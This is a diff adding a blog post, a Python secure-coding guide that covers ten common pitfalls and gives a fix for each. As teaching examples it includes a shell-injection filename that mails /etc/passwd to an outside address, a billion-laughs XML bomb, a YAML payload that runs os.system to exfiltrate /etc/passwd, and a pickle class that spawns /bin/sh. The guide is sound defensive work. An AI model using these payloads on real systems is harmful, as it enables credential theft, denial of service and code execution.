@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>10 common security gotchas in Python and how to avoid them</title>
+
+    <!-- Facebook Meta tags -->
+    <meta property="og:title" content="10 common security gotchas in Python and how to avoid them">
+    <meta property="og:description" content="A list of common security holes in Python applications, what causes them and how not to make those mistakes.">
+    <meta property="og:image" content="https://tonybaloney.github.io/img/posts/danger-snake.jpeg">
+    <meta property="og:url" content="https://tonybaloney.github.io/posts/10-common-security-gotchas-in-python.html">
+    <!-- Twitter Meta Tags -->
+    <meta name="twitter:title" content="10 common security gotchas in Python and how to avoid them">
+    <meta name="twitter:description" content="A list of common security holes in Python applications, what causes them and how not to make those mistakes.">
+    <meta name="twitter:image" content="https://tonybaloney.github.io/img/posts/danger-snake.jpeg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@anthonypjshaw">
+
+    <!-- Bootstrap Core CSS -->
+    <link href="/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Theme CSS -->
+    <link href="/css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Custom Fonts -->
+    <link href="/vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+</head>
+
+<body>
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    Menu <i class="fa fa-bars"></i>
+                </button>
+
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/#">Home</a>
+                    </li>
+                    <li>
+                        <a href="/#projects">Projects</a>
+                    </li>
+                    <li>
+                        <a href="/#contributions">Contributions</a>
+                    </li>
+                    <li>
+                        <a href="/#courses">Courses</a>
+                    </li>
+                    <li>
+                        <a href="/#podcasts">Podcasts</a>
+                    </li>
+                    <li>
+                        <a href="/#talks">Talks</a>
+                    </li>
+                    <li>
+                        <a href="/#blog">Blog</a>
+                    </li>
+                    <li>
+                        <a href="https://twitter.com/anthonypjshaw"><i class='fa fa-2x fa-twitter'></i></a>
+                    </li>
+                    <li>
+                        <a href="https://github.com/tonybaloney"><i class='fa fa-2x fa-github'></i></a>
+                    </li>
+                    <li>
+                        <a href="/rss.xml"><i class='fa fa-2x fa-rss-square'></i></a>
+                    </li>
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header class="intro-header" style="background-image: url('/img/posts/danger-snake.jpeg')">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="site-heading">
+                        <h1>10 common security gotchas in Python and how to avoid them</h1>
+                        <hr class="small">
+                        <span class="subheading">by Anthony Shaw, June 18, 2018</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <p>Writing secure code is hard. When you learn a language, a module or a framework, you learn how it <strong>supposed to be use</strong>. When thinking about security, you need to think about <strong>how it can be misused</strong>. Python is no exception, even within the standard library there are documented bad practices for writing hardened applications. Yet, when I’ve spoken to many Python developers they simply aren’t aware of them.</p>
+<p>Here are my top 10, <strong>in no particular order</strong>, common gotchas in Python applications.</p>
+<h2>1. Input injection</h2>
+<p>Injection attacks are broad and really common and there are many types of injection. They impact all languages, frameworks and environments.</p>
+<p><strong>SQL injection</strong> is where you’re writing SQL queries directly instead of using an ORM and mixing your string literals with variables. I’ve read plenty of code where “escaping quotes” is deemed a fix. <strong>It isn’t</strong>. Familiarise yourself with all the complex ways SQL injection can happen with <a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">this cheatsheet</a>.</p>
+<p><strong>Command injection</strong> is anytime you’re calling a process using popen, subprocess, os.system and taking arguments from variables. When calling local commands there’s a possibility of someone setting those values to something malicious.</p>
+<p>Imagine this simple script (<a href="https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html">credit</a>). You call a subprocess with the filename as provided by the user:</p>
+<pre><code class="python">import subprocess
+
+def transcode_file(request, filename):
+    command = 'ffmpeg -i &quot;{source}&quot; output_file.mpg'.format(source=filename)
+    subprocess.call(command, shell=True)  # a bad idea!
+</code></pre>
+
+<p>The attacker sets the value of filename to <code>"; cat /etc/passwd | mail them@domain.com</code> or something equally dangerous.</p>
+<h3>Fix:</h3>
+<p>Sanitise input using the utilities that come with your web framework, if you’re using one. Unless you have a good reason, don’t construct SQL queries by hand. Most ORMs have builtin sanitization methods.</p>
+<p>For the shell, use the <code>shlex</code> module to escape input correctly.</p>
+<h2>2. Parsing XML</h2>
+<p>If your application ever loads and parses XML files, the odds are you are using one of the XML standard library modules. There are a few common attacks through XML. Mostly DoS-style (designed to crash systems instead of exfiltration of data). Those attacks are common, especially if you’re parsing external (ie non-trusted) XML files.</p>
+<p>One of those is called “billion laughs”, because of the payload normally containing a lot (billions) of “lols”. Basically, the idea is that you can do referential entities in XML, so when your unassuming XML parser tries to load this XML file into memory it consumes <strong>gigabytes of RAM</strong>. Try it out if you don’t believe me :-)</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol &quot;lol&quot;&gt;
+  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
+  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
+  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
+  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
+  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
+  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
+  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
+  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
+]&gt;
+&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
+</code></pre>
+
+<p>Another attack uses <strong>external entity expansion</strong>. XML supports referencing entities from external URLs, the XML parser would typically fetch and load that resource without any qualms. “An attacker can circumvent firewalls and gain access to restricted resources as all the requests are made from an internal and trustworthy IP address, not from the outside.”</p>
+<p>Another situation to consider is 3rd party packages you’re depending on that decode XML, like configuration files, remote APIs. You might not even be aware that one of your dependencies leaves itself open to these types of attacks.</p>
+<p>So what happens in Python? Well, the standard library modules, etree, DOM, xmlrpc are all wide open to these types of attacks. It’s <a href="https://docs.python.org/3/library/xml.html#xml-vulnerabilities">well documented</a>.</p>
+<h3>Fix:</h3>
+<p>Use <a href="https://pypi.org/project/defusedxml/"><code>defusedxml</code></a> as a drop-in replacement for the standard library modules. It adds safe-guards against these types of attacks.</p>
+<h2>3. Assert statements</h2>
+<p>Don’t use assert statements to guard against pieces of code that a user shouldn’t access. Take this simple example</p>
+<pre><code class="python">def foo(request, user):
+   assert user.is_admin, &quot;user does not have access&quot;
+   # secure code...
+</code></pre>
+
+<p>Now, by default Python executes with <code>__debug__</code> as true, but in a production environment it’s common to run with optimizations. This will <strong>skip the assert statement</strong> and go straight to the secure code regardless of whether the user <code>is_admin</code> or not.</p>
+<h3>Fix:</h3>
+<p>Only use assert statements to communicate with other developers, such as in unit tests or in to guard against incorrect API usage.</p>
+<h2>4. Timing attacks</h2>
+<p>Timing attacks are a way of exposing the behaviour and algorithm by timing how long it takes to compare provided values. Timing attacks require precision, so they don’t typically work over a high-latency remote network. Because of the variable latency involved in most web-applications, it’s pretty much impossible to write a timing attack over HTTP web servers.</p>
+<p>But, if you have a command-line application that prompts for the password, an attacker can write a simple script to time how long it takes to compare their value with the actual secret. <a href="http://jyx.github.io/blog/2014/02/02/timing-attack-proof-of-concept/">Example</a>.</p>
+<p>There are some impressive examples such as <a href="https://github.com/c0r3dump3d/osueta">this SSH-based timing attack</a> written in Python if you want to see how they work.</p>
+<h3>Fix:</h3>
+<p>Use <code>secrets.compare_digest</code> , introduced in Python 3.5 to compare passwords and other private values.</p>
+<h2>5. A polluted site-packages or import path</h2>
+<p>Python’s import system is very flexible. Which is great when you’re trying to write monkey-patches for your tests, or overload core functionality.</p>
+<p>But, it’s one of the biggest security holes in Python.</p>
+<p>Installing 3rd party packages into your site-packages, whether in a virtual environment or the global site-packages (which is generally discouraged) exposes you to security holes in those packages.</p>
+<p>There have been occurrences of packages being published to PyPi with similar names to popular packages, but instead executing arbitrary code. The biggest incidence, luckily wasn’t harmful and just “made a point” that the problem is not really being addressed..</p>
+<p>Another situation to think about is the dependencies of your dependencies (and so forth). They could include vulnerabilities and they could also override default behaviour in Python via the import system.</p>
+<h3>Fix:</h3>
+<p>Vet your packages. Look <a href="http://pyup.io/">at PyUp.io and their security service</a>. Use virtual environments for all applications and ensure your global site-packages is as clean as possible. Check package signatures.</p>
+<h2>6. Temporary files</h2>
+<p>To create temporary files in Python, you’d typically generate a file name using <code>mktemp()</code> function and then create a file using this name. “This is not secure, because a different process <strong>may create a file</strong> with this name in the time between the call to <code>mktemp()</code> and the subsequent attempt to create the file by the first process.” <a href="https://docs.python.org/3/library/tempfile.html#deprecated-functions-and-variables">1</a> This means it could trick your application into either loading the wrong data or exposing other temporary data.</p>
+<p>Recent versions of Python will raise a runtime warning if you call the incorrect method.</p>
+<h3>Fix:</h3>
+<p>Use the <code>tempfile</code> module and use <code>mkstemp()</code> if you need to generate temporary files.</p>
+<h2>7. Using yaml.load</h2>
+<p>To quote the PyYAML documentation:</p>
+<blockquote>
+“Warning: It is not safe to call yaml.load with any data received from an untrusted source! yaml.load is as powerful as pickle.load and so may call any Python function.”
+</blockquote>
+
+<p>This <a href="https://www.talosintelligence.com/reports/TALOS-2017-0305">beautiful example</a> found in the popular Python project Ansible. You could provide Ansible Vault with this value as the (valid) YAML. It calls <code>os.system()</code> with the arguments provided in the file.</p>
+<pre><code class="yaml">!!python/object/apply:os.system [&quot;cat /etc/passwd | mail me@hack.c&quot;]
+</code></pre>
+
+<p>So, effectively loading YAML files from user-provided values leaves you wide-open to attack.</p>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/ATY_R6qEa3s?controls=0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+
+<p>Demo of this in action, credit Anthony Sottile</p>
+<h3>Fix:</h3>
+<p>Use <code>yaml.safe_load()</code>, pretty much always unless you have a really good reason.</p>
+<h2>8. Pickles</h2>
+<p>Deserializing pickle data is just as bad as YAML. Python classes can declare a magic-method called <code>__reduce__</code> which returns a string, or a tuple with a callable and the arguments to call when pickling. The attacker can use that to include references to one of the subprocess modules to run arbitrary commands on the host.</p>
+<p>This <a href="https://blog.nelhage.com/2011/03/exploiting-pickle/">wonderful example</a> shows how to pickle a class that opens a shell in Python 2. There are plenty <a href="https://lincolnloop.com/blog/playing-pickle-security/">more examples of how to exploit pickle</a>.</p>
+<pre><code class="python">import cPickle
+import subprocess
+import base64
+
+class RunBinSh(object):
+  def __reduce__(self):
+    return (subprocess.Popen, (('/bin/sh',),))
+
+print base64.b64encode(cPickle.dumps(RunBinSh()))
+</code></pre>
+
+<h3>Fix:</h3>
+<p>Never unpickle data from an untrusted or unauthenticated source. Use another serialization pattern instead, like JSON.</p>
+<h2>9. Using the system Python runtime and not patching it</h2>
+<p>Most POSIX systems come with a version of Python 2. Typically an old one.</p>
+<p>Since “Python”, ie CPython is written in C, there are times when the Python interpreter itself has holes. Common security issues in C are related to the allocation of memory, so buffer overflow errors.</p>
+<p>CPython has had a number of overrun or overflow vulnerabilities over the years, each of which have been patched and fixed in subsequent releases.</p>
+<p>So you’re safe. That is, <strong>if you patch your runtime</strong>.</p>
+<p>Here’s <a href="https://www.cvedetails.com/cve/CVE-2017-1000158/">an example from 2.7.13 and below</a>, an integer overflow vulnerability that enables code execution. <a href="https://distrowatch.com/table.php?distribution=ubuntu">That’s pretty much</a> any un-patched version of Ubuntu pre-17.</p>
+<h3>Fix:</h3>
+<p>Install the latest version of Python for your production applications, and patch it!</p>
+<h2>10. Not patching your dependencies</h2>
+<p>Similar to not patching your runtime, you also need to patch your dependencies regularly.</p>
+<p>I find the practice of “pinning” versions of Python packages from PyPi in packages terrifying. The idea is that “these are the versions that work” so everyone leaves it alone.</p>
+<p>All of the vulnerabilities in code I’ve mentioned above are just as important when they exist in packages that your application uses. Developers of those packages fix security issues. All the time.</p>
+<h3>Fix:</h3>
+<p>Use a service like PyUp.io to check for updates, raise pull/merge requests to your application and run your tests to keep the packages up to date.
+Use a tool like InSpec to <a href="https://www.inspec.io/docs/reference/resources/pip/">validate the installed versions on production environments</a> and ensure minimal versions or version ranges are patched.</p>
+<h2>Have you tried Bandit?</h2>
+<p>There’s a great static linter that will catch all of these issues in your code, and more!</p>
+<p>It’s called bandit, just <code>pip install bandit</code> and <code>bandit ./codedir</code>
+PyCQA/bandit</p>
+<h2>Check out my PyCharm plugin!</h2>
+<p>Since writing this article, I&rsquo;ve developed a plugin for PyCharm that warns and corrects your code for all of the issues raised in this article. (plus over 30 more)</p>
+<p>It is,</p>
+<ul>
+<li>Available as a PyCharm plugin on the <a href="https://plugins.jetbrains.com/plugin/13609-python-security">Jetbrains plugin marketplace</a></li>
+<li>Available as a GitHub Action for your CI/CD workflow <a href="https://github.com/marketplace/actions/pycharm-python-security-scanner">on the GitHub Marketplace</a>.</li>
+<li>Available as a standalone container image <a href="https://hub.docker.com/r/anthonypjshaw/pycharm-security">on the Docker Hub</a></li>
+</ul>
+<p>Documentation is available on <a href="https://pycharm-security.readthedocs.io/en/latest/?badge=latest">pycharm-security.readthedocs.io</a>, including examples and explanations for all the checks.</p>
+<p>Documentation for the GitHub action is <a href="https://pycharm-security.readthedocs.io/en/latest/github.html">on the documentation site</a>.</p>
+<h3>Credits</h3>
+<p>Credit to RedHat for <a href="https://access.redhat.com/blogs/766093/posts/2592591">this great article</a> that I used in some of my research.</p>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-md-4 col-md-offset-8">
+                <a class="btn-default btn"
+                   href="https://twitter.com/intent/tweet">
+                    <i class="fa fa-twitter"></i>
+                    Share on Twitter</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <ul class="list-inline text-center">
+                        <li>
+                            <a href="https://twitter.com/anthonypjshaw">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://medium.com/@anthonypjshaw">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-medium fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://github.com/tonybaloney">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    </ul>
+                    <p class="copyright text-muted">Copyright &copy; Anthony Shaw 2020</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="/vendor/jquery/jquery.min.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="/vendor/bootstrap/js/bootstrap.min.js"></script>
+
+    <!-- Theme JavaScript -->
+    <script src="/js/clean-blog.min.js"></script>
+
+    <!-- Twitter Helper -->
+    <script>window.twttr = (function(d, s, id) {
+        var js, fjs = d.getElementsByTagName(s)[0],
+            t = window.twttr || {};
+        if (d.getElementById(id)) return t;
+        js = d.createElement(s);
+        js.id = id;
+        js.src = "https://platform.twitter.com/widgets.js";
+        fjs.parentNode.insertBefore(js, fjs);
+
+        t._e = [];
+        t.ready = function(f) {
+            t._e.push(f);
+        };
+        return t;
+    }(document, "script", "twitter-wjs"));</script>
+</body>
+</html>
